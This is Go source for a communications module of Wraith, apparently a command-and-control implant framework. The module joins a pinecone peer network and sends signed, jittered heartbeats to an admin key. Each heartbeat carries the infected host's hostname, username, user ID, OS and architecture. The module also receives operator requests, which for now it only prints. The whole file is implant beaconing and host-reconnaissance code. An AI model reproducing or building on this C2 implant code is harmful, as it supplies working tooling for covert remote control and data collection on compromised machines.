package modulepinecomms

import (
	"context"
	"crypto/ed25519"
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"os/user"
	"runtime"
	"sync"
	"time"

	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/pmanager"
	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/proto"
	"dev.l1qu1d.net/wraith-labs/wraith/wraith/libwraith"
)

const (
	MOD_NAME = "w.pinecomms"

	SHM_ERRORS = "w.errors"
)

// A CommsManager module implementation which utilises (optionally) encrypted JWT
// as a base for its transfer protocol. This allows messages to be signed and
// verified both by the C2 and by Wraith. Otherwise, this CommsManager lacks any
// particularly advanced features and is meant as a simple default which does a
// good job in most usecases.
type ModulePinecomms struct {
	mutex sync.Mutex

	// Configuration properties

	OwnPrivKey   ed25519.PrivateKey
	AdminPubKey  ed25519.PublicKey
	ListenTcp    bool
	ListenWs     bool
	UseMulticast bool
	StaticPeers  []string
}

func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
	// Ensure this instance is only started once and mark as running if so
	single := m.mutex.TryLock()
	if !single {
		panic(fmt.Errorf("%s already running", MOD_NAME))
	}
	defer m.mutex.Unlock()

	// Make sure keys are valid
	if keylen := len(m.OwnPrivKey); keylen != ed25519.PrivateKeySize {
		panic(fmt.Errorf("[%s] incorrect private key size (is %d, should be %d)", MOD_NAME, keylen, ed25519.PublicKeySize))
	}
	if keylen := len(m.AdminPubKey); keylen != ed25519.PublicKeySize {
		panic(fmt.Errorf("[%s] incorrect public key size (is %d, should be %d)", MOD_NAME, keylen, ed25519.PublicKeySize))
	}

	// Get a struct for managing pinecone connections.
	pm := pmanager.GetInstance()

	//
	// Configure pinecone manager.
	//

	pm.SetPineconeIdentity(m.OwnPrivKey)
	//pm.SetInboundAddr(c.pineconeInboundTcpAddr)
	//pm.SetWebserverAddr(c.pineconeInboundWebAddr)
	pm.SetUseMulticast(m.UseMulticast)
	pm.SetStaticPeers(m.StaticPeers)

	// Start the pinecone manager and make sure it stops when
	// the module does.
	defer func() {
		pm.Stop()
	}()
	go pm.Start()

	//
	// Run the module.
	//

	// Heartbeat loop.
	go func() {
		// Cache some values used in the heartbeat.

		fingerprint := w.GetFingerprint()
		strain := w.GetStrainId()
		initTime := w.GetInitTime()
		hostname, err := os.Hostname()
		if err != nil {
			hostname = "<unknown>"
		}
		username := "<unknown>"
		userId := "<unknown>"
		currentUser, err := user.Current()
		if err == nil {
			username = currentUser.Username
			userId = currentUser.Uid
		}
		errs, _ := w.SHMGet(SHM_ERRORS).([]error)

		for {
			// Pick an interval between min and max for the next heartbeat.
			interval := rand.Intn(
				proto.HEARTBEAT_INTERVAL_MAX - proto.HEARTBEAT_INTERVAL_MIN,
			)

			// Send heartbeat after interval or exit if requested.
			select {
			case <-ctx.Done():
				return
			case <-time.After(
				time.Duration(interval+proto.HEARTBEAT_INTERVAL_MIN) * time.Second,
			):
				// Build a heartbeat data packet.
				heartbeatData := proto.PacketHeartbeat{
					Fingerprint: fingerprint,
					StrainId:    strain,
					InitTime:    initTime,
					HostOS:      runtime.GOOS,
					HostArch:    runtime.GOARCH,
					Hostname:    hostname,
					HostUser:    username,
					HostUserId:  userId,
					Errors:      errs,
				}
				heartbeatBytes, err := proto.Marshal(&heartbeatData, m.OwnPrivKey)
				if err != nil {
					panic("error while marshaling heartbeat data, cannot continue: " + err.Error())
				}

				// Send the packet.
				pm.Send(ctx, proto.Packet{
					Peer:   hex.EncodeToString(m.AdminPubKey),
					Method: "POST",
					Route:  proto.ROUTE_HEARTBEAT,
					Data:   heartbeatBytes,
				})
			}
		}
	}()

	// Start receiving messages.
	// Background context is okay because the channel will be closed
	// when the manager exits further down anyway.
	recv := pm.RecvChan(context.Background())

	// Mainloop.
	for {
		select {
		// Trigger exit when requested.
		case <-ctx.Done():
			return
		// Process incoming packets.
		case packet := <-recv:
			switch packet.Route {
			case proto.ROUTE_REQUEST:
				// TODO: Prevent replay attacks
				packetData := proto.PacketReq{}
				proto.Unmarshal(&packetData, m.AdminPubKey, packet.Data)
				fmt.Printf("%v\n", packetData)
			}
		}
	}
}

// Return the name of this module.
func (m *ModulePinecomms) WraithModuleName() string {
	return MOD_NAME
}
